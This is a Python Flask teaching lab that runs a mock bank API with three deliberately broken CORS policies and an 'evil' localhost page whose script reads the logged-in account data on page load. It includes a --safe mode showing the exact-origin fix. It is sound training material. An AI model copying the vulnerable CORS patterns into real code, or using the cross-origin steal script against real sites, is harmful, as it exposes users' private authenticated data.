# /// script
# requires-python = ">=3.11"
# dependencies = ["flask>=3.0"]
# ///
"""
app.py — cross-origin resource sharing (CORS) misconfiguration, three ways
==========================================================================

Week 11's second lab target, a companion to the xss-lab next door. CORS is a
*two-origin* story — one site reading another's responses — so this one program
starts TWO servers on two ports, which (because a port is part of an origin)
are two different origins:

    http://127.0.0.1:8000   THE BANK   a logged-in API that serves your private
                                        account data behind a session cookie
    http://127.0.0.1:9000   THE EVIL   an attacker-controlled page you visit in
                                        another tab; its JavaScript tries to
                                        read the bank's response

The whole lab is one question: **when your browser, carrying your bank cookie,
makes a request to the bank from the evil page, is the evil page's JavaScript
allowed to READ the reply?** The browser decides that from the CORS headers the
bank sends back. Get those headers wrong and any website on the internet can
read your logged-in data.

THREE MISCONFIGURATIONS, on three bank endpoints:

    /api/reflect    echoes the request's Origin back in
                    Access-Control-Allow-Origin and sets
                    Access-Control-Allow-Credentials: true   -> TOTAL BREAK:
                    any origin can read your authenticated response.

    /api/naive      tries to be careful ("only allow our own host") but checks
                    the origin with startswith(), so the sibling attacker origin
                    on a different PORT slips through                -> same break.

    /api/wildcard   Access-Control-Allow-Origin: *   -> the SUBTLE one: the
                    browser refuses to combine "*" with credentials, so the
                    credentialed steal is BLOCKED — but "*" still exposes the
                    endpoint to every origin for unauthenticated reads.


WHAT CORS ACTUALLY IS (AND IS NOT)
----------------------------------
By default the browser's Same-Origin Policy lets a page SEND a cross-origin
request but forbids its JavaScript from READING the response. CORS is the
mechanism a server uses to opt specific other origins back IN to reading. So:

  * CORS is enforced by the BROWSER, not the server. A blocked request usually
    still REACHES the server and still runs; the browser just refuses to hand
    the response bytes back to the foreign page's script.
  * Therefore CORS is NOT access control and NOT CSRF protection. It governs
    who may READ a response, never who may SEND a request.
  * For the browser to expose a *credentialed* response (one that rode a
    cookie), the server must return BOTH
        Access-Control-Allow-Credentials: true
        Access-Control-Allow-Origin: <the exact origin>   (never "*")
    Reflecting whatever Origin asked satisfies that for EVERYONE — which is the
    headline bug.


THE FIX, IN ONE SENTENCE
------------------------
Allow only an exact, closed allow-list of origins you trust; never reflect the
Origin header and never pair credentials with "*". --safe does exactly that:
every endpoint drops its sloppy policy and answers only the one trusted origin.

    uv run week-11/cors-lab/app.py            # vulnerable, bank :8000 / evil :9000
    uv run week-11/cors-lab/app.py --safe     # the three bugs fixed
    uv run week-11/cors-lab/app.py --bank-port 8100 --evil-port 9100

Both servers bind 127.0.0.1 only. All state is in memory. This is a teaching
target in the spirit of DVWA / WebGoat — never expose it, never copy these
patterns into real code.
"""
from __future__ import annotations

import argparse
import json
import threading
from html import escape

from flask import Flask, Response, redirect, request
from werkzeug.serving import make_server

# --safe flips this on. When False (the default) the bank's CORS policy is
# broken; when True every endpoint uses one correct, exact-match policy.
SAFE = False

# Set from --bank-port / --evil-port in main(), before the apps are built.
BANK_PORT = 8000
EVIL_PORT = 9000


def bank_origin() -> str:
    return f"http://127.0.0.1:{BANK_PORT}"


def evil_origin() -> str:
    return f"http://127.0.0.1:{EVIL_PORT}"


# ---------------------------------------------------------------------------
# The "logged-in" state and the secret the attacker is after.
#
# "Logging in" just sets a session cookie. The cookie is HttpOnly (JavaScript
# cannot read it) AND SameSite=None (so the browser attaches it to cross-origin
# requests, which is the realistic setting for an API meant to serve other
# origins). Note HttpOnly does NOT save you here: the attack never reads the
# cookie — it rides the cookie to read the RESPONSE. See the README.
# ---------------------------------------------------------------------------
SESSION_COOKIE = "session"
SESSION_VALUE = "alice-session-token"

ACCOUNT = {
    "owner": "Alice Example",
    "account": "SG64-0042-1337",
    "balance": "S$ 48,250.00",
    "api_token": "sk_live_3f9a2c7e1b8d46f0",  # the kind of secret you really don't want leaked
}


# ===========================================================================
# THE ONE FUNCTION THAT DECIDES SAFE-VS-VULNERABLE.
#
# Given the request's Origin and which endpoint was hit, return the CORS
# response headers. In --safe mode the endpoint's own policy is ignored and a
# single correct rule is used everywhere. In vulnerable mode each endpoint
# demonstrates a different classic mistake.
# ===========================================================================
def cors_headers(origin: str | None, policy: str) -> dict[str, str]:
    if SAFE:
        # THE FIX: allow only an exact, closed allow-list. The browser is told
        # the specific origin (echoed, but only after an == match against the
        # list) and Vary: Origin keeps caches from mixing responses up.
        allowed = {bank_origin()}  # a real app lists its own front-end origin(s)
        if origin in allowed:
            return {
                "Access-Control-Allow-Origin": origin,
                "Access-Control-Allow-Credentials": "true",
                "Vary": "Origin",
            }
        return {}  # unknown origin -> no CORS headers -> browser blocks the read

    # ---- vulnerable policies, one per endpoint ----
    if policy == "reflect":
        # THE BUG: echo back WHATEVER origin asked, and allow credentials. That
        # pair tells the browser "yes, this exact origin may read the cookie'd
        # response" — for every origin that ever asks.
        if origin:
            return {
                "Access-Control-Allow-Origin": origin,
                "Access-Control-Allow-Credentials": "true",
            }
        return {}

    if policy == "naive":
        # THE BUG: a well-meaning but sloppy check. The intent is "only our own
        # host, 127.0.0.1", but startswith() also matches the attacker origin on
        # a different PORT. The real-world version is `startswith("https://
        # bank.com")`, which happily matches `https://bank.com.evil.com`.
        if origin and origin.startswith("http://127.0.0.1"):
            return {
                "Access-Control-Allow-Origin": origin,
                "Access-Control-Allow-Credentials": "true",
            }
        return {}

    if policy == "wildcard":
        # THE SUBTLE ONE: "*" lets any origin read — but the browser REFUSES to
        # expose a credentialed response when the allow-origin is "*". So the
        # cookie'd steal is blocked; what leaks is only the unauthenticated
        # response. Not the catastrophe reflection is, still not something you
        # want on anything protected by network position.
        return {"Access-Control-Allow-Origin": "*"}

    return {}


def apply_cors(resp: Response, policy: str) -> Response:
    origin = request.headers.get("Origin")
    for key, value in cors_headers(origin, policy).items():
        resp.headers[key] = value
    return resp


# A small shared chrome so both sites look consistent and show the mode.
def page(title: str, body: str, *, evil: bool = False) -> str:
    mode = "SAFE (exact-origin allow-list)" if SAFE else "VULNERABLE (sloppy CORS)"
    mode_colour = "#1b5e20" if SAFE else "#b71c1c"
    site_colour = "#4a148c" if evil else "#0d47a1"
    site_label = f"EVIL · {evil_origin()}" if evil else f"BANK · {bank_origin()}"
    return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>{escape(title)} — CORS lab</title>
  <style>
    body {{ font-family: system-ui, sans-serif; max-width: 48rem; margin: 2rem auto;
            padding: 0 1rem; line-height: 1.5; color: #222; }}
    .tag {{ color: white; padding: .4rem .8rem; border-radius: .3rem;
            font-size: .85rem; display: inline-block; margin-right: .4rem; }}
    .card {{ border: 1px solid #ccc; border-radius: .5rem; padding: 1rem; margin: 1rem 0; }}
    button {{ padding: .5rem 1rem; font-size: 1rem; cursor: pointer; margin: .2rem 0; }}
    code {{ background: #f0f0f0; padding: 0 .2rem; }}
    pre {{ background: #111; color: #0f0; padding: .8rem; border-radius: .4rem;
           overflow-x: auto; white-space: pre-wrap; word-break: break-all; }}
    .ok {{ color: #1b5e20; font-weight: bold; }}
    .bad {{ color: #b71c1c; font-weight: bold; }}
  </style>
</head>
<body>
  <p>
    <span class="tag" style="background:{site_colour}">{escape(site_label)}</span>
    <span class="tag" style="background:{mode_colour}">{mode}</span>
  </p>
  <h1>{escape(title)}</h1>
  {body}
</body>
</html>"""


# ===========================================================================
# THE BANK  —  http://127.0.0.1:8000
# ===========================================================================
def make_bank() -> Flask:
    app = Flask("bank")

    def account_response(policy: str) -> Response:
        """The protected resource. Returns the account only to a valid session,
        then attaches this endpoint's CORS headers."""
        logged_in = request.cookies.get(SESSION_COOKIE) == SESSION_VALUE
        if logged_in:
            resp = Response(json.dumps(ACCOUNT), status=200, mimetype="application/json")
        else:
            resp = Response(
                json.dumps({"error": "not authenticated — no valid session cookie"}),
                status=401,
                mimetype="application/json",
            )
        return apply_cors(resp, policy)

    @app.get("/")
    def home() -> str:
        logged_in = request.cookies.get(SESSION_COOKIE) == SESSION_VALUE
        if logged_in:
            session_box = f"""
            <div class="card">
              <p class="ok">You are logged in as {escape(ACCOUNT['owner'])}.</p>
              <p>This page reads the API <em>same-origin</em>, which never needs
                 CORS at all:</p>
              <pre>{escape(json.dumps(ACCOUNT, indent=2))}</pre>
              <form method="post" action="/logout"><button>Log out</button></form>
            </div>"""
        else:
            session_box = """
            <div class="card">
              <p class="bad">You are not logged in.</p>
              <form method="post" action="/login">
                <button>Log in as Alice</button>
              </form>
            </div>"""
        body = f"""
        <p>This is the "bank": an API that serves Alice's private account data
        behind a session cookie. {session_box}
        <div class="card">
          <h3>Now play the victim</h3>
          <p>With that session cookie set, open the attacker's site in another
          tab and watch what its JavaScript can read:</p>
          <p><a href="{evil_origin()}">{evil_origin()}</a></p>
        </div>
        <div class="card">
          <h3>Three endpoints, three CORS policies</h3>
          <ul>
            <li><code>/api/reflect</code> — echoes your Origin + allows credentials</li>
            <li><code>/api/naive</code> — a <code>startswith()</code> origin check</li>
            <li><code>/api/wildcard</code> — <code>Access-Control-Allow-Origin: *</code></li>
          </ul>
          <p>Inspect the headers directly with curl (no browser needed):</p>
          <pre>curl -i -H "Origin: http://evil.example" {bank_origin()}/api/reflect</pre>
        </div>"""
        return page("The bank", body)

    @app.post("/login")
    def login() -> Response:
        resp = redirect("/")
        # SameSite=None so the browser sends this cookie on cross-origin requests
        # (realistic for an API meant to serve other origins). Secure is required
        # with SameSite=None; 127.0.0.1 counts as a secure context, so browsers
        # accept it over http here. HttpOnly keeps JS from reading the cookie —
        # which, note, does NOT stop the CORS attack.
        resp.set_cookie(
            SESSION_COOKIE, SESSION_VALUE,
            httponly=True, samesite="None", secure=True, path="/",
        )
        return resp

    @app.post("/logout")
    def logout() -> Response:
        resp = redirect("/")
        resp.delete_cookie(SESSION_COOKIE, path="/")
        return resp

    @app.get("/api/reflect")
    def api_reflect() -> Response:
        return account_response("reflect")

    @app.get("/api/naive")
    def api_naive() -> Response:
        return account_response("naive")

    @app.get("/api/wildcard")
    def api_wildcard() -> Response:
        return account_response("wildcard")

    return app


# ===========================================================================
# THE EVIL SITE  —  http://127.0.0.1:9000
#
# A completely separate origin. Its page runs JavaScript that fetch()es the
# bank's endpoints with credentials:'include' (so the browser attaches the
# bank cookie) and tries to read the reply. Whether it can is decided entirely
# by the bank's CORS headers — nothing here changes between safe and vulnerable
# mode except that the reads start failing.
# ===========================================================================
def make_evil() -> Flask:
    app = Flask("evil")

    @app.get("/")
    def home() -> str:
        bank = bank_origin()
        body = f"""
        <p>You are reading this on the attacker's origin,
        <code>{evil_origin()}</code>. You never logged in here. Yet if you have
        a session at the bank, the script on this page may be able to read your
        private account data from <code>{bank}</code>.</p>

        <div class="card">
          <p><strong>Step 1.</strong> Make sure you are logged in at
            <a href="{bank}" target="_blank">{bank}</a> (open it, click
            "Log in as Alice").</p>
          <p><strong>Step 2.</strong> Come back and press a button — or just
            notice the first one already ran when the page loaded.</p>
        </div>

        <div class="card">
          <h3>1. Reflected origin + credentials</h3>
          <button onclick="steal('/api/reflect', true)">
            fetch /api/reflect (with cookies)</button>
          <pre id="out-reflect">(not run yet)</pre>
        </div>
        <div class="card">
          <h3>2. Naive startswith() check</h3>
          <button onclick="steal('/api/naive', true)">
            fetch /api/naive (with cookies)</button>
          <pre id="out-naive">(not run yet)</pre>
        </div>
        <div class="card">
          <h3>3. Wildcard <code>*</code></h3>
          <button onclick="steal('/api/wildcard', true)">
            fetch /api/wildcard (with cookies)</button>
          <button onclick="steal('/api/wildcard', false)">
            fetch /api/wildcard (no cookies)</button>
          <pre id="out-wildcard">(not run yet)</pre>
        </div>

        <script>
          const BANK = {json.dumps(bank)};
          async function steal(path, withCookies) {{
            const box = document.getElementById("out-" + path.split("/").pop());
            box.textContent = "...fetching " + BANK + path +
              (withCookies ? "  (credentials: include)" : "  (no credentials)");
            try {{
              const r = await fetch(BANK + path, {{
                credentials: withCookies ? "include" : "omit"
              }});
              const text = await r.text();
              box.textContent =
                "READ OK  (HTTP " + r.status + ") — the browser handed us the body:\\n\\n"
                + text;
            }} catch (e) {{
              box.textContent =
                "BLOCKED by CORS — fetch threw:\\n  " + e + "\\n\\n"
                + "The request may still have reached the bank, but the browser "
                + "refused to expose the response to this origin.";
            }}
          }}
          // The drama of CORS: no click needed. Just visiting runs this.
          window.addEventListener("load", () => steal("/api/reflect", true));
        </script>"""
        return page("Totally Legit Cat Pictures", body, evil=True)

    return app


# ===========================================================================
# STARTUP — run both servers, bank in a daemon thread, evil in the main thread.
# ===========================================================================
def _serve(app: Flask, port: int) -> None:
    make_server("127.0.0.1", port, app).serve_forever()


def main() -> None:
    ap = argparse.ArgumentParser(description="Week 11 CORS teaching lab (localhost only).")
    ap.add_argument("--safe", action="store_true",
                    help="use an exact-origin allow-list — the three bugs fixed")
    ap.add_argument("--bank-port", type=int, default=8000, help="bank API port (default 8000)")
    ap.add_argument("--evil-port", type=int, default=9000, help="attacker site port (default 9000)")
    args = ap.parse_args()

    globals()["SAFE"] = args.safe
    globals()["BANK_PORT"] = args.bank_port
    globals()["EVIL_PORT"] = args.evil_port

    bank, evil = make_bank(), make_evil()

    print("=" * 64)
    print("  Week 11 — CORS lab")
    print(f"  Mode: {'SAFE (exact-origin allow-list)' if SAFE else 'VULNERABLE (sloppy CORS)'}")
    print(f"  Bank (victim API): {bank_origin()}")
    print(f"  Evil (attacker)  : {evil_origin()}")
    print("  Log in at the bank, then open the evil site. Localhost only.")
    print("=" * 64)

    threading.Thread(target=_serve, args=(bank, BANK_PORT), daemon=True).start()
    _serve(evil, EVIL_PORT)


if __name__ == "__main__":
    main()
